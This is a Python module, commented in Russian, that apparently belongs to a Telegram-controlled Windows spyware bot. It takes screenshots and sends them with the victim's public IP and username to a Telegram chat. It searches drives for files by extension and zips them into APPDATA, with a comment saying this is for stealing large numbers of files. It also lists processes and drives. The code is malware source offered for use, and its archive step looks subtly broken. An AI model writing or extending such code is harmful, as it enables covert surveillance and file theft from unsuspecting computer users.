import getpass
import os
import zipfile
from datetime import datetime
from os.path import getsize, join, basename
from random import randrange
import psutil

import pyautogui
import wmi
from requests import get

import config


# Генератор уникального ID для мульти-доступа
def getID():
    return randrange(config.limit_id)


# Получаем имя пользователя WINDOWS
def getUser():
    return getpass.getuser()


# Мульти-доступ к ботам за счет "уникального" ID --- (Нужен False)
def equalsID(message_id, bot_id):
    return not message_id == bot_id


# Проверка на количество аргументов команды (0 - /команда ; 1..5 - аргументы) --- (Нужен False)
def arrayEqualLength(msgArray, length):
    return len(msgArray) < length + 1


# Извлекаем из сообщения массив аргументов
def getArrayMessage(message):
    return ("{0}".format(message.text)).split(" ")


# Делаем скриншот экрана компьютера c необходимыми данными
def image_with_data(bot, chat_id, bot_id):
    screenImage = pyautogui.screenshot()
    ip = get('https://api.ipify.org').content.decode('utf8')
    bot.send_photo(chat_id, screenImage,
                   str(f"ID: {bot_id}\n" +
                       f"IP: {ip}\n" +
                       f"USER: {getUser()}\n {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"))


# Поиск файлов указанного расширения на указанном диске
def searchFiles(bot, chat_id, disk, fileFormat, pathFiles):
    try:
        if pathFiles:
            pathFiles.clear()

        for root, dirs, files in os.walk(str(disk) + ':\\', topdown=False):
            for file_name in files:
                if file_name.endswith("." + str(fileFormat)):
                    pathFiles.append(join(root, file_name))

        pathFiles.sort(key=lambda x: os.path.getmtime(x))

        bot.send_message(chat_id, str(
            'files: ' + str(len(pathFiles)) + '\n' +
            'size: ' + str(sum(getsize(name) for name in pathFiles) / 1048576) + ' MB'))

        return pathFiles
    except Exception as i:
        print(i)
        return []


# Архивация всех файлов указанных в массиве (если нужно украсть огромное количество файлов)
def archiveFiles(pathFiles):
    try:
        name = os.environ['APPDATA'] + '\\' + datetime.now().strftime('%d.%m.%Y.%H.%M.%S') + '.zip'
        with zipfile.ZipFile(name, 'w', zipfile.ZIP_DEFLATED) as zipped_f:
            zipped_f.extractall()
            for file in pathFiles:
                zipped_f.write(file, basename(file))
        zipped_f.close()
        return name
    except Exception as i:
        print(i)
        pass


# Имена всех процессов компьютера
def getAllProcesses():
    text = str()

    for process in wmi.WMI().Win32_Process():
        text += f" |{process.Name}| "

    return text


# Имена всех дисков компьютера
def getAllDrives():
    return psutil.disk_partitions(all=True)
